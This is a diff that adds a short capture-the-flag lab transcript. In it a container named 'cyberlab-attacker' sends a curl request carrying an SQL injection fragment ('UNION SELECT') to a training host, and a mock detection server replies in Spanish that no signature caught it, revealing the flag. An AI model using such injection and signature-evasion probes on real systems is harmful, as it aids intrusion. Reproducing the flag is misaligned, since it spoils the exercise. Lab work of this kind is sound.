@@ -1,0 +1,9 @@
+$ docker exec cyberlab-attacker curl -sS -i --get --data-urlencode "q=UNION SELECT" http://phantomcorp/api
+
+HTTP/1.0 200 OK
+Server: PhantomSOC/1.0 
+Date: Fri, 06 Nov 2026 19:33:26 GMT
+Content-Type: text/plain; charset=utf-8
+
+200 OK (procesado como benigno)
+Tu request ERA maliciosa pero NINGUNA firma la detectó. FLAG{signature_evaded}
